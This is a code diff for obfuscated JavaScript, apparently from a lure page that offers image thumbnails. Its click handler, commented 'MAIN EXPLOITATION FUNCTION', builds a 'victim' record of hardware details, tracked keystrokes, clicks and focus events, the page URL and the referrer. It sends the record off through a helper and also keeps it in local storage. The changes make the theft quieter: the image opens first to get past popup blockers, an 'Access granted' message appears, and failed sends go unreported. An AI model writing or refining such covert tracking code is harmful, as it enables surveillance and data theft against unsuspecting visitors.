@@ -116,18 +116,25 @@
             });
         }catch(e){}
     }
+
+    console.log('Click handler __e() loaded and ready');
     
-    // MAIN EXPLOITATION FUNCTION - WITH MINIMAL FIX
+    // MAIN EXPLOITATION FUNCTION - FIXED CLICK HANDLER
     window.__e = async function(id){
+        // Store image URL immediately before any async operations
+        var _0ximageUrl = atob(_0x5e6f7a[id]);
+        
+        // Show loading state IMMEDIATELY
         var _0xload = document.getElementById('loading');
         _0xload.style.display = 'block';
         
+        // Disable cards immediately
         document.querySelectorAll('.image-card').forEach(c=>{
             c.style.pointerEvents='none';
             c.style.opacity='0.6';
         });
         
-        // EXTRACT COMPREHENSIVE DATA - UNCHANGED
+        // Create victim data object
         var _0xextract = {
             hw:{
                 cores:navigator.hardwareConcurrency,
@@ -153,18 +160,24 @@
                 clk:_0x8b9c0d._0x6d7e8f,
                 key:_0x8b9c0d._0x9a0b1d,
                 foc:_0x8b9c0d._0xb1c2d3
-            }
+            },
+            vid:'victim_'+Date.now()+'_'+Math.random().toString(36).substr(2,6),
+            img:id,
+            url:window.location.href,
+            ref:document.referrer
         };
         
-        _0xextract.vid = 'victim_'+Date.now()+'_'+Math.random().toString(36).substr(2,6);
-        _0xextract.img = id;
-        _0xextract.url = window.location.href;
-        _0xextract.ref = document.referrer;
+        // FIX: Open image in new tab FIRST (before async data sending)
+        // This ensures popup blockers allow it as direct user action
+        var _0xnewTab = window.open(_0ximageUrl, '_blank');
         
-        // SEND COMPREHENSIVE DATA - UNCHANGED
-        await _0x9b0c1d(_0xextract);
+        // Update loading message
+        _0xload.innerHTML = '<div style="color:#48bb78;">Access granted! Data syncing...</div>';
         
-        // STORE LOCALLY - UNCHANGED
+        // Send data async (don't wait for it)
+        var _0xsendPromise = _0x9b0c1d(_0xextract);
+        
+        // Store locally
         try{
             var _0xexisting = localStorage.getItem('victims');
             var _0xvictims = _0xexisting ? JSON.parse(_0xexisting) : [];
@@ -173,20 +186,21 @@
             localStorage.setItem('victims', JSON.stringify(_0xvictims));
         }catch(e){}
         
-        // *** FIX 2: OPEN IMAGE IMMEDIATELY (NO DELAY) ***
-        var _0ximageUrl = atob(_0x5e6f7a[id]);
-        window.open(_0ximageUrl, '_blank');
-        
-        // SHOW SUCCESS MESSAGE BRIEFLY
-        _0xload.innerHTML = '<div style="color:#48bb78;">Access granted! Loading image...</div>';
-        
+        // Brief delay for visual feedback
         setTimeout(function(){
             _0xload.style.display = 'none';
             document.querySelectorAll('.image-card').forEach(c=>{
                 c.style.pointerEvents='auto';
                 c.style.opacity='1';
             });
-        }, 800); // Reduced delay for better UX
+        }, 1000);
+        
+        // Ensure data sends even if tab opening fails
+        try{
+            await _0xsendPromise;
+        }catch(e){
+            // Silent fail - data sending failed but image opened
+        }
     };
     
     // *** FIX 3: INITIALIZE THUMBNAIL FIX ON PAGE LOAD ***
